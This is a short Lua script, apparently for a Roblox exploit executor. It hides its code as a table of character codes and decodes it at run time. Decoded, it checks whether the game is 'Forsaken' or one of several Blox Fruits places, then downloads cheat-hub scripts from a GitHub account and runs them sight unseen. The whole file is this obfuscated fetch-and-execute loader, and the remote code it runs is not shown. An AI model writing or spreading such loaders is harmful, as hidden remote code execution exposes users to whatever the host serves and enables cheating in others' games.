local _={
114,101,112,101,97,116,32,116,97,115,107,46,119,97,105,116,40,41,32,117,110,116,105,108,32,103,97,109,101,58,73,115,76,111,97,100,101,100,40,41,10,
10,
108,111,99,97,108,32,70,111,114,115,97,107,101,110,73,68,32,61,32,54,51,51,49,57,48,50,49,53,48,10,
10,
108,111,99,97,108,32,66,108,111,120,70,114,117,105,116,115,32,61,32,123,10,
32,32,32,32,91,50,55,53,51,57,49,53,53,52,57,93,32,61,32,116,114,117,101,44,10,
32,32,32,32,91,52,52,52,50,50,55,50,49,56,51,93,32,61,32,116,114,117,101,44,10,
32,32,32,32,91,55,52,52,57,52,50,51,54,51,53,93,32,61,32,116,114,117,101,10,
125,10,
10,
105,102,32,103,97,109,101,46,71,97,109,101,73,100,32,61,61,32,70,111,114,115,97,107,101,110,73,68,32,116,104,101,110,10,
32,32,32,32,108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,
104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,
98,108,111,111,100,104,117,98,45,101,109,112,121,116,105,47,
110,97,104,105,119,105,110,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,
103,111,110,109,105,110,105,45,104,117,98,
34,41,41,40,41,10,
10,
101,108,115,101,105,102,32,66,108,111,120,70,114,117,105,116,115,91,103,97,109,101,46,80,108,97,99,101,73,100,93,32,116,104,101,110,10,
32,32,32,32,108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,
104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,
98,108,111,111,100,104,117,98,45,101,109,112,121,116,105,47,
110,97,104,105,119,105,110,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,
115,107,105,98,105,100,105,104,117,98,
34,41,41,40,41,10,
101,110,100
}

loadstring(string.char(table.unpack(_)))()
